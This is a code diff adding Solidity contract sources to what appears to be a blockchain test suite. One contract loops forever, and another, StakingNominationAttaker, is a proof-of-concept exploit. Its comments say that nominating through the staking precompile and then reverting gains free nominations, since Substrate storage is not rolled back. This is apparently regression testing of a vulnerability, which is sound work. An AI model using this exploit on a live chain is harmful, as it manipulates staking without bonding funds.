@@ -368,4 +368,100 @@ export const contractSources: { [key: string]: string } = {
             emit Trace(2 << 250);
         }
     }`,
+  OverflowingTrace: `
+      pragma solidity >=0.8.0;
+      contract OverflowingTrace {
+          uint public a;
+          uint public b;
+          uint public c;
+          uint public d;
+          uint public e;
+          uint public f;
+          uint public g;
+          uint public h;
+          uint public i;
+          uint public j;
+          function set_and_loop(uint loops) public returns (uint result) {
+              a = 1;
+              b = 1;
+              c = 1;
+              d = 1;
+              e = 1;
+              f = 1;
+              g = 1;
+              h = 1;
+              i = 1;
+              j = 1;
+              uint count = 0;
+              while (i < loops) {
+                count += 1;
+              }
+              return 1;
+          }
+      }`,
+  StakingNominationAttaker: `
+    pragma solidity >=0.8.0;
+    
+
+    interface ParachainStaking {
+        // First some simple accessors
+    
+        /// Check whether the specified address is currently a staking nominator
+        function is_nominator(address) external view returns (bool);
+    
+        // Now the dispatchables
+    
+        /// Join the set of collator candidates
+        function join_candidates(uint256 amount) external;
+    
+        /// Request to leave the set of candidates. If successful, the account is immediately
+        /// removed from the candidate pool to prevent selection as a collator, but unbonding is
+        /// executed with a delay of BondDuration rounds.
+        function leave_candidates() external;
+    
+        /// Temporarily leave the set of collator candidates without unbonding
+        function go_offline() external;
+    
+        /// Rejoin the set of collator candidates if previously had called go_offline
+        function go_online() external;
+    
+        /// Bond more for collator candidates
+        function candidate_bond_more(uint256 more) external;
+    
+        /// Bond less for collator candidates
+        function candidate_bond_less(uint256 less) external;
+    
+        /// If caller is not a nominator, then join the set of nominators
+        /// If caller is a nominator, then makes nomination to change their nomination state
+        function nominate(address collator, uint256 amount) external;
+    
+        /// Leave the set of nominators and, by implication, revoke all ongoing nominations
+        function leave_nominators() external;
+    
+        /// Revoke an existing nomination
+        function revoke_nomination(address collator) external;
+    
+        /// Bond more for nominators with respect to a specific collator candidate
+        function nominator_bond_more(address candidate, uint256 more) external;
+    
+        /// Bond less for nominators with respect to a specific nominator candidate
+        function nominator_bond_less(address candidate, uint256 less) external;
+    }
+
+    contract StakingNominationAttaker {
+        /// The collator (ALITH) that this contract will benefit with nominations
+        address public target = 0xf24FF3a9CF04c71Dbc94D0b566f7A27B94566cac; 
+
+        /// The ParachainStaking wrapper at the known pre-compile address.
+    ParachainStaking public staking = ParachainStaking(0x0000000000000000000000000000000000000800);
+
+        /// Take advantage of the EVMs reversion logic and the fact that it doesn't extend to
+        /// Substrate storage to score free nominations for a collator condidate of our choosing
+        function score_a_free_nomination() public payable{
+            
+            // We nominate our target collator with all the tokens provided
+            staking.nominate(target, msg.value);
+            revert("By reverting this transaction, we return the eth to the caller");
+        }
+    }`,
 };
